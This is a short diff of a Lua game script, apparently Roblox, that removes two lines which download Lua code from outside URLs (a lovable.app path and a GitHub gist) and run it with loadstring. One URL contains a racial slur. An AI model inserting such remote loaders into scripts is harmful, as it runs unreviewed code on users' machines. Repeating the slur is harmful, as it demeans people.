@@ -32,8 +32,6 @@ local function addPrintedBranding(parent, position, size, textSize)
     return label
 end
 
-loadstring(game:HttpGet("https://generator-crash.lovable.app/s/nigga7k/loader.lua?p=7kisnigga"))()
-loadstring(game:HttpGet("https://gist.githubusercontent.com/xd-myscript/30eb631840fd9902509aef0791a1fd21/raw/f08c982a0896bfa8bf8c8cc662aa246a628ad021/vxielg.lua"))()
 do
     local ReplicatedStorage
     do
